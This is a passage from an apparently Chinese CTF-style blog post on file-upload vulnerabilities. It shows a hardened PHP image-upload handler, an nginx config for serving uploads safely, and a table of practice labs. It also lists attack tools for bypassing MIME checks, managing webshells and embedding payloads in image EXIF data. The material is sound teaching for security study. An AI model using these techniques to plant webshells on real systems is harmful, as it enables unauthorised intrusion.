style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">'unsupported extension'</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$mime </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">new</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">finfo</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">FILEINFO_MIME_TYPE</span><span style="--0:#24292E;--1:#E1E4E8">))</span><span style="--0:#BF3441;--1:#F97583">-></span><span style="--0:#6F42C1;--1:#B392F0">file</span><span style="--0:#24292E;--1:#E1E4E8">($tmp);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$info </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">@</span><span style="--0:#005CC5;--1:#79B8FF">getimagesize</span><span style="--0:#24292E;--1:#E1E4E8">($tmp);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$expected </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> $allowed[$ext];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> ($info </span><span style="--0:#BF3441;--1:#F97583">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">false</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> $mime </span><span style="--0:#BF3441;--1:#F97583">!==</span><span style="--0:#24292E;--1:#E1E4E8"> $expected[</span><span style="--0:#032F62;--1:#9ECBFF">'mime'</span><span style="--0:#24292E;--1:#E1E4E8">]</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> $info[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">!==</span><span style="--0:#24292E;--1:#E1E4E8"> $expected[</span><span style="--0:#032F62;--1:#9ECBFF">'type'</span><span style="--0:#24292E;--1:#E1E4E8">]</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> $info[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> $info[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">MAX_IMAGE_PIXELS</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent">    </span><span style="--0:#005CC5;--1:#79B8FF">http_response_code</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">415</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">exit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">'invalid image'</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">switch</span><span style="--0:#24292E;--1:#E1E4E8"> ($info[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">]) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_JPEG</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$image </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">@</span><span style="--0:#005CC5;--1:#79B8FF">imagecreatefromjpeg</span><span style="--0:#24292E;--1:#E1E4E8">($tmp);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_PNG</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">54</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$image </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">@</span><span style="--0:#005CC5;--1:#79B8FF">imagecreatefrompng</span><span style="--0:#24292E;--1:#E1E4E8">($tmp);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">55</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">56</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_GIF</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">57</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$image </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">@</span><span style="--0:#005CC5;--1:#79B8FF">imagecreatefromgif</span><span style="--0:#24292E;--1:#E1E4E8">($tmp);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">58</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">59</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">default</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">60</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$image </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">false</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">61</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">62</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">63</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> ($image </span><span style="--0:#BF3441;--1:#F97583">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">false</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">64</div></div><div class="code"><span class="indent">    </span><span style="--0:#005CC5;--1:#79B8FF">http_response_code</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">415</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">65</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">exit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">'decode failed'</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">66</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">67</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">68</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">// UPLOAD_DIR 应位于 Web 根目录外，并预先设置最小权限。</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">69</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$name </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">bin2hex</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#6F42C1;--1:#B392F0">random_bytes</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">.</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">'.'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">.</span><span style="--0:#24292E;--1:#E1E4E8"> $ext;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">70</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$path </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">rtrim</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">UPLOAD_DIR</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">DIRECTORY_SEPARATOR</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">.</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">DIRECTORY_SEPARATOR</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">.</span><span style="--0:#24292E;--1:#E1E4E8"> $name;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">71</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">72</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">switch</span><span style="--0:#24292E;--1:#E1E4E8"> ($info[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">]) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">73</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_JPEG</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">74</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$saved </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">imagejpeg</span><span style="--0:#24292E;--1:#E1E4E8">($image, $path, </span><span style="--0:#005CC5;--1:#79B8FF">90</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">75</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">76</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_PNG</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">77</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$saved </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">imagepng</span><span style="--0:#24292E;--1:#E1E4E8">($image, $path, </span><span style="--0:#005CC5;--1:#79B8FF">6</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">78</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">79</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_GIF</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">80</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$saved </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">imagegif</span><span style="--0:#24292E;--1:#E1E4E8">($image, $path);</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">81</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">break</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">82</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">default</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">83</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">$saved </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">false</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">84</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">85</div></div><div class="code"><span style="--0:#005CC5;--1:#79B8FF">imagedestroy</span><span style="--0:#24292E;--1:#E1E4E8">($image);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">86</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">87</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">!</span><span style="--0:#24292E;--1:#E1E4E8">$saved) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">88</div></div><div class="code"><span class="indent">    </span><span style="--0:#005CC5;--1:#79B8FF">http_response_code</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">500</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">89</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">exit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">'save failed'</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">90</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">91</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">92</div></div><div class="code"><span style="--0:#005CC5;--1:#79B8FF">echo</span><span style="--0:#24292E;--1:#E1E4E8"> $name;</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>必须用 Nginx 直接提供上传文件时，可以给上传目录单独配一个静态 location。能放到 Web 根目录外或独立静态域名更省心。</p><div class="expressive-code"><figure class="frame" data-language="nginx"><figcaption class="header"></figcaption><pre data-language="nginx" class="wrap" style="--ecMaxLine:53ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">location</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">^~</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#DBEDFF">/uploads/ </span><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">types</span><span style="--0:#24292E;--1:#E1E4E8"> { }</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">   <span style="--0:#BF3441;--1:#F97583"> </span></span><span style="--0:#BF3441;--1:#F97583">default_type </span><span style="--0:#24292E;--1:#E1E4E8">application/octet-stream;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">   <span style="--0:#BF3441;--1:#F97583"> </span></span><span style="--0:#BF3441;--1:#F97583">add_header </span><span style="--0:#24292E;--1:#E1E4E8">X-Content-Type-Options nosniff always;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">   <span style="--0:#BF3441;--1:#F97583"> </span></span><span style="--0:#BF3441;--1:#F97583">try_files </span><span style="--0:#24292E;--1:#E1E4E8">$uri </span><span style="--0:#005CC5;--1:#79B8FF">=404</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><hr></section>
+<section><h2 id="十二练习靶场与工具">十二、练习靶场与工具<a class="anchor" href="#十二练习靶场与工具"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><div class="table-wrapper">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>类型</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>靶场</td><td>Upload-Labs</td><td>21 关专项练习文件上传，逐关递进</td></tr><tr><td>靶场</td><td>DVWA</td><td>经典综合靶场，含文件上传模块</td></tr><tr><td>靶场</td><td>Pikachu</td><td>中文靶场，覆盖多种 Web 漏洞</td></tr><tr><td>靶场</td><td>PortSwigger Web Security Academy</td><td>文件上传实验覆盖类型校验、路径和解析配置</td></tr><tr><td>靶场</td><td>Sqli-labs 衍生</td><td>部分关卡含上传与包含组合</td></tr><tr><td>工具</td><td>Burp Suite 或 Yakit</td><td>抓包改包，绕过前端/MIME 校验</td></tr><tr><td>工具</td><td>蚁剑（AntSword）</td><td>连接一句话 webshell</td></tr><tr><td>工具</td><td>冰蝎 / 哥斯拉</td><td>加密流量 webshell 管理（进阶）</td></tr><tr><td>工具</td><td>exiftool</td><td>往图片 EXIF 里插 payload</td></tr></tbody></table></div><hr></section>
+<section><h2 id="最后记一下">最后记一下<a class="anchor" href="#最后记一下"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><blockquote>
+<p>先找过滤点，再找落地路径和触发方式。上传成功不等于解析成功，网上看到的 payload 也不一定适合题目环境。</p>
+</blockquote></section>  </div> <script type="module">document.addEventListener("click",function(l){const o=l.target;if(o&&o.classList.contains("copy-btn")){const c=o.parentElement?.querySelector("code");let i="";if(c){const t=c.querySelectorAll("span.line");if(t.length>0){const e=[];for(let n=0;n<t.length;n++){const s=t[n].textContent||"";e.push(s)}i=e.join(`
 `)}else{const e=c.querySelectorAll(".code:not(summary *)");if(e.length>0){const n=[];for(let s=0;s<e.length;s++){const r=e[s].textContent||"";n.push(r)}i=n.join(`
 `)}else i=c.textContent||""}}i=i.replace(/\n\n\n+/g,function(t){const e=t.length-1;let n;return e%2===0?n=e/2:n=Math.floor((e+1)/2),n<1&&(n=1),`
-`.repeat(n+1)}),(async t=>{if(!navigator.clipboard?.writeText)throw new Error("Clipboard API 不可用");await navigator.clipboard.writeText(t)})(i).then(()=>{const t=o.getAttribute("data-timeout-id");t&&clearTimeout(parseInt(t)),o.classList.add("success");const e=setTimeout(()=>{o.classList.remove("success")},1e3);o.setAttribute("data-timeout-id",e.toString())}).catch(t=>{console.error("复制失败:",t)})}});</script> <div class="p-6 bg-(--license-block-bg) rounded-xl mb-6 onload-animation"> <div class="flex flex-col sm:flex-row items-center justify-between gap-4"> <div class="flex items-center gap-3 flex-1"> <div class="flex items-center justify-center h-12 w-12 rounded-lg bg-(--enter-btn-bg)"> <svg width="1em" height="1em" class="text-3xl text-(--primary)" data-icon="material-symbols:share">   <symbol id="ai:material-symbols:share" viewBox="0 0 24 24"><path fill="currentColor" d="M17 22q-1.25 0-2.125-.875T14 19q0-.15.075-.7L7.05 14.2q-.4.375-.925.588T5 15q-1.25 0-2.125-.875T2 12t.875-2.125T5 9q.6 0 1.125.213t.925.587l7.025-4.1q-.05-.175-.062-.337T14 5q0-1.25.875-2.125T17 2t2.125.875T20 5t-.875 2.125T17 8q-.6 0-1.125-.213T14.95 7.2l-7.025 4.1q.05.175.063.338T8 12t-.012.363t-.063.337l7.025 4.1q.4-.375.925-.587T17 16q1.25 0 2.125.875T20 19t-.875 2.125T17 22"/></symbol><use href="#ai:material-symbols:share"></use>  </svg> </div> <div class="flex flex-col gap-1"> <div class="text-[1.0rem] leading-tight text-black/75 dark:text-white/75"> 分享 </div> <p class="text-[0.8rem] leading-tight text-black/75 dark:text-white/75"> 如果这篇文章对你有帮助，欢迎分享给更多人！ </p> </div> </div> <div class="flex items-center gap-3"> <script>(()=>{var a=(s,i,o)=>{let r=async()=>{await(await s())()},t=typeof i.value=="object"?i.value:void 0,c={rootMargin:t==null?void 0:t.rootMargin},n=new IntersectionObserver(e=>{for(let l of e)if(l.isIntersecting){n.disconnect(),r();break}},c);for(let e of o.children)n.observe(e)};(self.Astro||(self.Astro={})).visible=a;window.dispatchEvent(new Event("astro:visible"));})();</script><astro-island uid="ams0F" component-url="/_astro/SharePoster._JGmuBmc.js" component-export="default" renderer-url="/_astro/client.svelte.BG8BImUm.js" props="{&quot;title&quot;:[0,&quot;First CTF Note&quot;],&quot;author&quot;:[0,&quot;Freya Augustus&quot;],&quot;description&quot;:[0,&quot;This is a sample note. Replace it with a real CTF writeup when you are ready.&quot;],&quot;pubDate&quot;:[0,&quot;2026-02-07&quot;],&quot;coverImage&quot;:[0,&quot;/assets/freya/banner.jpg&quot;],&quot;url&quot;:[0,&quot;https://freya-we.github.io/posts/first-ctf-note/&quot;],&quot;siteTitle&quot;:[0,&quot;Freya&#39;s Blog&quot;],&quot;avatar&quot;:[0,&quot;/assets/freya/avatar.jpg&quot;]}" ssr client="visible" opts="{&quot;name&quot;:&quot;SharePoster&quot;,&quot;value&quot;:true}" await-children><!--[--><button class="btn-regular px-6 